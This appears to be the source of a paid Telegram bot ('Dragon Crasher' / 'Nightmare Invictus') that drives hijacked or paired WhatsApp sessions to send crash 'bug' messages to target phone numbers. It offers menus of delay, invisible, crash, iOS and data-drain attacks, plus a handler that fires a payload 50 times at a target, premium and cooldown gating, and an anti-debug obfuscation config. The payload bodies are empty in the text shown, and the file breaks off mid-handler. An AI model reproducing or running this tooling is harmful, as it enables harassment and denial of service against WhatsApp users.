const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function getActiveSock() {
  if (sessions.size === 0) return null;
  return sessions.values().next().value;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(u => u.id === userId);
  if (!user) return "Non-Premium";
  const now = new Date();
  const expiry = new Date(user.expiresAt);
  return expiry > now ? "Premium Aktif" : "Expired";
}

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');

function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));

// ==========================
// Fungsi untuk cek status premium user
function getPremiumStatus(userId) {
    const user = premiumUsers.find(u => u.id === userId);
    if (!user) return "Non-Premium";
    const now = new Date();
    const expiry = new Date(user.expiresAt);
    return expiry > now ? "Premium Aktif" : "Expired";
}
// ==========================

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/anugrahbaehaqi/dbscc2/refs/heads/main/token.json"; 

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Tangani error polling Telegram
bot.on("polling_error", (error) => {
  console.error("Polling error:", error.message);
});

function startBot() {
  console.log(
    chalk.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀
⠀⠀⠀⠀
╭───────□□□■■■───────╮
│𝐒𝐜𝐫𝐢𝐩𝐭 : 𝐃𝐫𝐚𝐠𝐨𝐧 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟐.𝟎
│𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : @ZexxOfficial
╰───────■■■□□□───────╯`)
  );
}

console.log(chalk.blue(`
🚀 Bot is live, let’s go..
`));

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Gagal koneksi WhatsApp:", error.message);
bot.sendMessage(config.OWNER_ID[0], `❌ Gagal koneksi ke WhatsApp: ${error.message}`);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  // Cek jika sesi sudah aktif
  if (sessions.has(botNumber)) {
    await bot.sendMessage(chatId, `Nomor ${botNumber} sudah terhubung.`);
    return;
  }

  // Notifikasi awal pairing
  let statusMessage = await bot
    .sendMessage(chatId, `Memulai proses pairing ke nomor ${botNumber}...`)
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    // Logging ke file
    const logText = `[${new Date().toISOString()}] Nomor: ${botNumber}, Status: ${connection}\n`;
    fs.appendFileSync("pairing-log.txt", logText);

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;

      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `Terjadi gangguan saat pairing ke nomor ${botNumber}, mencoba ulang...`,
          {
            chat_id: chatId,
            message_id: statusMessage,
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `Pairing ke nomor ${botNumber} gagal.`,
          {
            chat_id: chatId,
            message_id: statusMessage,
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Gagal menghapus sesi:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `Pairing ke nomor ${botNumber} berhasil.`,
        {
          chat_id: chatId,
          message_id: statusMessage,
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `Pairing berhasil diproses.\nKode pairing Anda: ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
            }
          );
        }
      } catch (error) {
        console.error("Gagal meminta kode pairing:", error);
        await bot.editMessageText(
          `Pairing ke nomor ${botNumber} gagal.`,
          {
            chat_id: chatId,
            message_id: statusMessage,
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}




//-# Fungsional Function Before Parameters

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} d, ${hours} h, ${minutes} m, ${secs} s`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

// Get Random Video
function getRandomVideo() {
  const Video = [
        "https://files.catbox.moe/0v2zgm.mp4",
        "https://files.catbox.moe/0v2zgm.mp4",
        "https://files.catbox.moe/0v2zgm.mp4"
  ];
  return Video[Math.floor(Math.random() * Video.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}


function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// ~ Enc Xnelcrow Confugurasi
const getXnelcrowObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `Xnelcrow和X无V2气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_©xnelcrow",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}

// ---------( The Bug Function)----------

// ---------( The End Function)----------

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomVideo = getRandomVideo();

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `\`\`\`—NightmareInvictus
Olaaa , Я — бот Telegram, созданный @ZexxOfficial. Я могу отправлять функции ошибок, которые приводят к сбоям в работе WhatsApp. Используйте меня с умом.

╭━━ 𖤊--------⪩ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ⪨--------𖤊
│ 以 Bᴏᴛ Nᴀᴍᴇ : Nightmare Invictus
┃ 以 Vᴇʀsɪᴏɴ : 1.0
│ 以 Sᴛᴀᴛᴜs : Vip Buy Only 
┃ 以 Lᴀᴜɴɢᴀɢᴇ : JavaScript
│ 以 Tʏᴘᴇ : Button
┃ 以 Pʀᴇғɪx  : /
╰━━━━━━━━━━━━━━━━━━━❍

╭━━  𖤊--------( sᴛᴀᴛᴜs ᴘʀᴇᴍɪᴜᴍ )--------𖤊
│  以 Usᴇʀs : ${username}
┃  以 ID : ${senderId}
│  以 Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
┃  以 Rᴜɴᴛɪᴍᴇ : ${runtime}
╰━━━━━━━━━━━━━━━━━━━❍

 𖤊--------( ᴏᴡɴᴇʀ ᴍᴇɴᴜ )--------𖤊
─▢ /addprem <id> <day>
─▢ /delprem <id>
─▢ /listprem 
─▢ /setjeda <5m>
─▢ /addadmin <id>
─▢ /deladmin <id>
─▢ /addpairing <62××>

 以 𝑺𝒆𝒃𝒆𝒍𝒖𝒎 𝒎𝒆𝒏𝒋𝒂𝒍𝒂𝒏𝒌𝒂𝒏 𝑩𝒖𝒈 
     𝑾𝒂𝒋𝒊𝒃 /𝒂𝒅𝒅𝒑𝒂𝒊𝒓𝒊𝒏𝒈 𝒅𝒖𝒍𝒖 
    𝒂𝒈𝒂𝒓 𝒃𝒖𝒈 𝒅𝒂𝒑𝒂𝒕 𝒃𝒆𝒓𝒋𝒂𝒍𝒂𝒏
\`\`\`    
𝑨𝒖𝒕𝒉𝒐𝒓 : @ZexxOfficial
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Thangs", callback_data: "thanks" }, { text: "Akses ☇ Menu", callback_data: "owner_menu" }],
        [{ text: "Bug ☇ Menu", callback_data: "trashmenu" }]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomVideo = getRandomVideo();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `\`\`\`—NightmareInvictus
Olaaa , Я — бот Telegram, созданный @ZexxOfficial. Я могу отправлять функции ошибок, которые приводят к сбоям в работе WhatsApp. Используйте меня с умом.
  
╭━━  𖤊--------( sᴛᴀᴛᴜs ᴘʀᴇᴍɪᴜᴍ )--------𖤊
│  以 Usᴇʀs : ${username}
┃  以 ID : ${senderId}
│  以 Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
┃  以 Rᴜɴᴛɪᴍᴇ : ${runtime}
╰━━━━━━━━━━━━━━━━━━━❍

━━━( 𝘉 𝘜 𝘎 - 𝘈 𝘙 𝘌 𝘈 )━━━
    
  「 Invisible Type 」
─▢ /delayinvis 62××
─▢ /Invisible 62××
─▢ /betainvis 62××
─▢ /delayhard 62××

  「 Attack Type 」
─▢ /blank 62××
─▢ /System 62××
─▢ /hardware 62××
─▢ /special 62××

「 Crash Type 」
─▢ /Payload 62××
─▢ /LocationX 62××
─▢ /SpamCrash 62××

「 Ios Type 」
─▢ /IosX 62××
─▢ /LocaOx 62××
─▢ /Paydox 62××

「 Drain Type 」
─▢ /sedotkuota 62××

\`\`\`
  `;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "owner_menu") {
      caption = `\`\`\`—NightmareInvictus
Olaaa , Я — бот Telegram, созданный @ZexxOfficial. Я могу отправлять функции ошибок, которые приводят к сбоям в работе WhatsApp. Используйте меня с умом.
   
─▢ /addprem <id> <day>
─▢ /delprem <id>
─▢ /listprem 
─▢ /setjeda <5m>
─▢ /addadmin <id>
─▢ /deladmin <id>
─▢ /addpairing <62××>
\`\`\`
`;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "thanks") {
      caption = `\`\`\`—NightmareInvictus🐉
Olaaa , Я — бот Telegram, созданный @ZexxOfficial. Я могу отправлять функции ошибок, которые приводят к сбоям в работе WhatsApp. Используйте меня с умом.

╭━━⋗  ☇ 𝗧𝗵𝗮𝗻𝗸𝘀-𝗧𝗼  」
┃-▢ NightmareInvictus🐉 ( sc ) 
┃-▢ RyzzModss ( Owner ) 
┃-▢ All buyer Dragon Crasher
╰━━━━━━━━━━━━━━━━━⋗
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `\`\`\`—NightmareInvictus
Olaaa , Я — бот Telegram, созданный @ZexxOfficial. Я могу отправлять функции ошибок, которые приводят к сбоям в работе WhatsApp. Используйте меня с умом.

╭━━ 𖤊--------⪩ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ⪨--------𖤊
│ 以 Bᴏᴛ Nᴀᴍᴇ : Nightmare Invictus
┃ 以 Vᴇʀsɪᴏɴ : 1.0
│ 以 Sᴛᴀᴛᴜs : Vip Buy Only 
┃ 以 Lᴀᴜɴɢᴀɢᴇ : JavaScript
│ 以 Tʏᴘᴇ : Button
┃ 以 Pʀᴇғɪx  : /
╰━━━━━━━━━━━━━━━━━━━❍

╭━━  𖤊--------( sᴛᴀᴛᴜs ᴘʀᴇᴍɪᴜᴍ )--------𖤊
│  以 Usᴇʀs : ${username}
┃  以 ID : ${senderId}
│  以 Pʀᴇᴍɪᴜᴍ : ${premiumStatus}
┃  以 Rᴜɴᴛɪᴍᴇ : ${runtime}
╰━━━━━━━━━━━━━━━━━━━❍

   𖤊--------( ᴏᴡɴᴇʀ ᴍᴇɴᴜ )--------𖤊
─▢ /addprem <id> <day>
─▢ /delprem <id>
─▢ /listprem 
─▢ /setjeda <5m>
─▢ /addadmin <id>
─▢ /deladmin <id>
─▢ /addpairing <62××>

 以 𝑺𝒆𝒃𝒆𝒍𝒖𝒎 𝒎𝒆𝒏𝒋𝒂𝒍𝒂𝒏𝒌𝒂𝒏 𝑩𝒖𝒈 
     𝑾𝒂𝒋𝒊𝒃 /𝒂𝒅𝒅𝒑𝒂𝒊𝒓𝒊𝒏𝒈 𝒅𝒖𝒍𝒖 
    𝒂𝒈𝒂𝒓 𝒃𝒖𝒈 𝒅𝒂𝒑𝒂𝒕 𝒃𝒆𝒓𝒋𝒂𝒍𝒂𝒏
\`\`\`    
𝑨𝒖𝒕𝒉𝒐𝒓 : @ZexxOfficial
`;
     replyMarkup = {
       inline_keyboard: [
       [{ text: "Thangs", callback_data: "thanks" }, { text: "Akses ☇ Menu", callback_data: "owner_menu" }],
       [{ text: "Bug ☇ Menu", callback_data: "trashmenu" }]
     ]
     };
   }

    await bot.editMessageMedia(
      {
        type: "video",
        media: randomVideo,
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});


//=======CASE BUG=========//
bot.onText(/\/delayinvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 50; i++) { 
  await Jtwdlyinvis(target);
  await sleep(350);
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/Invisible (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

